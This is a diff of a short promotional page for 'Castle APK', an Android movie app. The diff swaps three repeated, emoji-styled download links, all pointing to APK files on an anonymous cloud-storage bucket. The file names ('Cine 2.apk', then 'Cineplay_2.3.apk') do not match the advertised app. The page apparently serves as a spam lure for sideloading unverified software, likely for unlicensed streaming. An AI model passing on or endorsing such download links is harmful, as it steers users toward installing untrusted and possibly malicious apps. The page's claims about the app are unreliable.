@@ -1,9 +1,9 @@
 
 Castle APK is an increasingly popular option for movie lovers looking to enjoy a wide array of films on their Android devices. This platform provides access to a rich selection of movies, making it easier for users to find entertainment that suits their tastes. In this article, we will explore what Castle APK offers, how to use it, and what to keep in mind while using this application.
 
-**[[⬇🟢---->download apk<----🟢⬇]](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)** <br>
-**[[⬇🟢---->download apk<----🟢⬇]](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)** <br>
-**[[⬇🟢---->download apk<----🟢⬇]](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)**
+**[[⬇🟢---->download apk<----🟢⬇]](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)** <br>
+**[[⬇🟢---->download apk<----🟢⬇]](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)** <br>
+**[[⬇🟢---->download apk<----🟢⬇]](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)**
 
 ## What is Castle APK?
 
